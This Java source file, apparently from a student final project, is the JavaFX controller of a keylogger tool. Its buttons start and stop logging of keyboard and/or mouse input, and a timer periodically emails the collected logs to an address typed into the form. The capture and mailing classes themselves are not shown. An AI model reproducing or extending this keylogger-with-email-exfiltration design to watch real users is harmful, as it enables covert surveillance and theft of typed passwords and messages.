package com.example.finalproject;

import javafx.fxml.FXML;
import javafx.scene.control.CheckBox;
import javafx.scene.control.Label;
import javafx.scene.control.TextField;
import javafx.scene.layout.VBox;

import java.util.Timer;
import java.util.TimerTask;

public class HelloController {
    private static boolean isRunning;
    private final Timer timer = new Timer();
    private final SendMail sendMail = new SendMail(null);
    private final TimerTask timerTask = new TimerTask() {
        @Override
        public void run() {
            if (isRunning) {
                sendMail.sendmail();
            }
        }
    };
    private final KeyMouseLogger keyMouseLogger = new KeyMouseLogger();
    @FXML
    private Label welcomeText;
    @FXML
    private TextField mailGondermeAraligi;
    @FXML
    private TextField gonderilecekMailAdresi;
    @FXML
    private CheckBox onlyMouse;
    @FXML
    private CheckBox onlyKeyboard;
    @FXML
    private CheckBox mouseAndKeyboard;
    @FXML
    private VBox layout;
    @FXML
    private TextField maxLogSize;

    public void initialize() {
        System.out.println("initialize");
        mailGondermeAraligi.textProperty().addListener((observable, oldValue, newValue) -> {
            if (!newValue.matches("\\d*")) {
                mailGondermeAraligi.setText(newValue.replaceAll("[^\\d]", ""));
            }
        });
        maxLogSize.textProperty().addListener((observable, oldValue, newValue) -> {
            if (!newValue.matches("\\d*")) {
                maxLogSize.setText(newValue.replaceAll("[^\\d]", ""));
            }
        });
    }

    public void onStartKeylogger() {
        long gondermeAraligi = Long.parseLong(mailGondermeAraligi.getText());
        sendMail.setToAddress(gonderilecekMailAdresi.getText());
        keyMouseLogger.setScene(layout.getScene());

        keyMouseLogger.setMaxFileSize(Integer.parseInt(maxLogSize.getText()));
        keyMouseLogger.start();

        if (!isRunning) {
            timer.purge();
            timer.schedule(timerTask, gondermeAraligi * 60 * 1000, gondermeAraligi * 60 * 1000);
            isRunning = true;
        }
    }

    public void onStopKeylogger() {
        keyMouseLogger.stop();
        if (isRunning) {
            isRunning = false;
        }
    }

    public void onOnlyMouseClicked() {
        keyMouseLogger.setOnlyMouse(true);
        mouseAndKeyboard.setSelected(false);
        onlyKeyboard.setSelected(false);
    }

    public void onOnlyKeyboardClicked() {
        keyMouseLogger.setOnlyKeyboard(true);
        mouseAndKeyboard.setSelected(false);
        onlyMouse.setSelected(false);
    }

    public void onMouseAndKeyboardClicked() {
        onlyMouse.setSelected(false);
        onlyKeyboard.setSelected(false);
        keyMouseLogger.setMouseAndKeyboard(true);
    }

}